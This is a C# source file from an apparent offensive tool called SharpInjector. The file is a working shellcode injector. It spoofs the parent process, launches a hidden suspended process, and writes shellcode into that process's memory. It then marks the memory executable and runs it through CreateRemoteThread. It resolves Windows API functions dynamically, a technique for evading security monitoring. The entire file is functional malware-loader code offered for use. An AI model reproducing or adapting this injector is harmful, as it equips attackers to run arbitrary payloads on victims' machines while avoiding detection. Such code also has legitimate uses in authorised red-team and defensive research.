﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpInjector
{
    class CreateRemoteThread
    {
        public static void ExecuteCreateRemoteThread(string ParentName, string ProgramPath, byte[] Shellcode)
        {
            WinAPI.STARTUPINFOEX StartupInfoEx = new WinAPI.STARTUPINFOEX();
            IntPtr lpSize = IntPtr.Zero;

            WinAPI.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            StartupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            WinAPI.InitializeProcThreadAttributeList(StartupInfoEx.lpAttributeList, 1, 0, ref lpSize);

            // Get handle on parent
            Process ParentProcess = Process.GetProcessesByName(ParentName)[0];
            Console.WriteLine($"[*] Found parent process: {ParentProcess.ProcessName} (pid: {ParentProcess.Id})");
            IntPtr ParentHandle = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.PROCESS_CREATE_PROCESS | WinAPI.ProcessAccessFlags.PROCESS_DUP_HANDLE, false, ParentProcess.Id);

            IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, ParentHandle);

            WinAPI.UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList, 0, (IntPtr)WinAPI.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            WinAPI.SECURITY_ATTRIBUTES ps = new WinAPI.SECURITY_ATTRIBUTES();
            WinAPI.SECURITY_ATTRIBUTES ts = new WinAPI.SECURITY_ATTRIBUTES();

            ps.nLength = Marshal.SizeOf(ps);
            ts.nLength = Marshal.SizeOf(ts);

            IntPtr bytesWritten = IntPtr.Zero;


            WinAPI.PROCESS_INFORMATION ProcessInfo = new WinAPI.PROCESS_INFORMATION();

            bool success = WinAPI.CreateProcess(
                ProgramPath,
                null,
                ref ps,
                ref ts,
                true,
                WinAPI.ProcessCreationFlags.CREATE_SUSPENDED | WinAPI.ProcessCreationFlags.CREATE_NO_WINDOW | WinAPI.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT,
                IntPtr.Zero,
                null,
                ref StartupInfoEx,
                out ProcessInfo);

            if (ProcessInfo.hProcess == IntPtr.Zero)
            {
                return;
            }

            Console.WriteLine($"[*] Spwaned new instance of {ProgramPath} (pid: {ProcessInfo.dwProcessId})");
            Process Target = Process.GetProcessById((int)ProcessInfo.dwProcessId);


            Console.WriteLine("[*] Allocating shellcode...");
            IntPtr pVirtualAllocEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            WinAPI.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(WinAPI.VirtualAllocEx)) as WinAPI.VirtualAllocEx;
            IntPtr Address = VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
            if (Address == IntPtr.Zero)
            {
                WinAPI.TerminateProcess(ProcessInfo.hProcess, 0);
                return;
            }

            IntPtr pWriteProcessMemory = reprobate.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            WinAPI.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WinAPI.WriteProcessMemory)) as WinAPI.WriteProcessMemory;
            if (!WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
            {
                WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                return;
            }


            IntPtr pVirtualProtectEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            WinAPI.VirtualProtectEx VirtualProtectEx = Marshal.GetDelegateForFunctionPointer(pVirtualProtectEx, typeof(WinAPI.VirtualProtectEx)) as WinAPI.VirtualProtectEx;
            if (!VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
            {
                WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                return;
            }

            Console.WriteLine("[*] Calling CreateRemoteThread...");
            IntPtr pCreateRemoteThread = reprobate.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            WinAPI.CreateRemoteThread CreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pCreateRemoteThread, typeof(WinAPI.CreateRemoteThread)) as WinAPI.CreateRemoteThread;
            IntPtr hThread = CreateRemoteThread(ProcessInfo.hProcess, IntPtr.Zero, 0, Address, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                return;
            }
            Console.WriteLine("[*] Shellcode executed");
        }
    }
}
